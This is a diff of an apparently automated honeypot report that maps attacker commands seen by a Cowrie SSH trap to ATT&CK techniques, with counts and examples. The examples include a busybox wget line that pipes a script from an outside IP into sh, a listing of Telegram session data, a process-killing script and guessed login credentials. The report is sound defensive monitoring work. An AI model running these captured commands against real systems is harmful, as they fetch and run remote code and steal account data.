@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-28 20:00:45",
+  "generated": "2026-08-28 21:02:57",
   "totals": {
-    "commands": 404,
-    "login_failed": 2604,
-    "login_success": 81,
-    "sessions": 2776
+    "commands": 452,
+    "login_failed": 2646,
+    "login_success": 83,
+    "sessions": 2820
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2604,
+      "count": 2646,
       "examples": [
         "root / 0033",
         "root / 12345678",
@@ -21,14 +21,14 @@
         "root / 123456789"
       ],
       "first": "2026-08-28T00:00:26.408142Z",
-      "last": "2026-08-28T19:59:45.727605Z",
-      "unique_ips": 83
+      "last": "2026-08-28T21:01:41.203333Z",
+      "unique_ips": 86
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 81,
+      "count": 83,
       "examples": [
         "superadmin / Is$uper@dmin",
         "admin / admin",
@@ -37,8 +37,8 @@
         "ubuntu / ubuntu"
       ],
       "first": "2026-08-28T00:01:52.110632Z",
-      "last": "2026-08-28T19:57:52.271801Z",
-      "unique_ips": 61
+      "last": "2026-08-28T20:32:37.609667Z",
+      "unique_ips": 63
     },
     {
       "id": "T1222.002",
@@ -60,7 +60,7 @@
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 42,
+      "count": 54,
       "examples": [
         "/bin/busybox wget; /bin/busybox STC",
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;",
@@ -69,8 +69,8 @@
         "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sex"
       ],
       "first": "2026-08-28T00:51:50.759248Z",
-      "last": "2026-08-28T19:11:41.849090Z",
-      "unique_ips": 12
+      "last": "2026-08-28T20:32:55.257347Z",
+      "unique_ips": 13
     },
     {
       "id": "T1082",
@@ -87,6 +87,31 @@
       "first": "2026-08-28T02:17:21.577136Z",
       "last": "2026-08-28T19:55:44.673909Z",
       "unique_ips": 15
+    },
+    {
+      "id": "T1083",
+      "name": "File and Directory Discovery",
+      "tactic": "Discovery",
+      "count": 11,
+      "examples": [
+        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va",
+        "#!/bin/sh\n\nfor proc_dir in /proc/*; do\n    pid=${proc_dir##*/}\n\n    result=$(ls -l \"/proc/$pid/exe\" 2> /dev/null)\n\n    i"
+      ],
+      "first": "2026-08-28T07:00:33.184261Z",
+      "last": "2026-08-28T20:32:54.884902Z",
+      "unique_ips": 2
+    },
+    {
+      "id": "T1489",
+      "name": "Service Stop",
+      "tactic": "Impact",
+      "count": 10,
+      "examples": [
+        "#!/bin/sh\n\nfor proc_dir in /proc/*; do\n    pid=${proc_dir##*/}\n\n    result=$(ls -l \"/proc/$pid/exe\" 2> /dev/null)\n\n    i"
+      ],
+      "first": "2026-08-28T20:32:53.675091Z",
+      "last": "2026-08-28T20:32:54.884902Z",
+      "unique_ips": 1
     },
     {
       "id": "T1033",
@@ -156,18 +181,6 @@
       "unique_ips": 1
     },
     {
-      "id": "T1083",
-      "name": "File and Directory Discovery",
-      "tactic": "Discovery",
-      "count": 1,
-      "examples": [
-        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va"
-      ],
-      "first": "2026-08-28T07:00:33.184261Z",
-      "last": "2026-08-28T07:00:33.184261Z",
-      "unique_ips": 1
-    },
-    {
       "id": "T1095",
       "name": "Non-Application Layer Protocol",
       "tactic": "Command and Control",
@@ -195,31 +208,31 @@
   "unmapped": [
     [
       "sh",
-      29
+      30
     ],
     [
       "shell",
-      29
+      30
     ],
     [
       "system",
-      29
+      30
     ],
     [
       "/bin/busybox",
-      24
+      27
+    ],
+    [
+      "enable",
+      18
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
       18
     ],
     [
-      "enable",
-      17
-    ],
-    [
       "linuxshell",
-      16
+      17
     ],
     [
       "/bin/busybox UNSTABLE",
@@ -231,6 +244,10 @@
     ],
     [
       "ping ;sh",
+      11
+    ],
+    [
+      "sh .k",
       10
     ],
     [
@@ -267,10 +284,6 @@
     ],
     [
       ">/dev/netslink/.codi && cd /dev/netslink/",
-      4
-    ],
-    [
-      ">/dev/shm/.codi && cd /dev/shm/",
       4
     ]
   ]
